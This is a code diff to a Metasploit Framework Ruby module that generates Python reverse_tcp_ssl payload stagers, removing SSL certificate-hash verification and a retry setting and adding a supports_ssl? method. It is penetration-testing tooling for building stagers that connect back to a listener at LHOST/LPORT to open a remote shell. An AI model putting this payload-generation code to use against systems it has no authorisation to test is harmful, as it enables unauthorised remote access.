@@ -1,14 +1,13 @@
 # -*- coding: binary -*-
 
 require 'msf/core'
-require 'msf/core/payload/windows/verify_ssl'
 require 'msf/core/payload/python/reverse_tcp'
 
 module Msf
 
 ###
 #
-# Complex reverse_tcp payload generation for Python
+# Complex reverse_tcp_ssl payload generation for Python
 #
 ###
 
@@ -16,20 +15,14 @@ module Payload::Python::ReverseTcpSsl
 
   include Msf::Payload::Python
   include Msf::Payload::Python::ReverseTcp
-  include Msf::Payload::Windows::VerifySsl
 
   #
   # Generate the first stage
   #
   def generate
-    verify_cert_hash = get_ssl_cert_hash(datastore['StagerVerifySSLCert'],
-                                         datastore['HandlerSSLCert'])
     conf = {
       port:        datastore['LPORT'],
-      host:        datastore['LHOST'],
-      retry_count: datastore['ReverseConnectRetries'],
-      ssl:              true,
-      verify_cert_hash: verify_cert_hash
+      host:        datastore['LHOST']
     }
 
     generate_reverse_tcp_ssl(conf)
@@ -43,8 +36,8 @@ module Payload::Python::ReverseTcpSsl
     false
   end
 
-  def transport_config(opts={})
-    transport_config_reverse_tcp_ssl(opts)
+  def supports_ssl?
+    true
   end
 
   def generate_reverse_tcp_ssl(opts={})
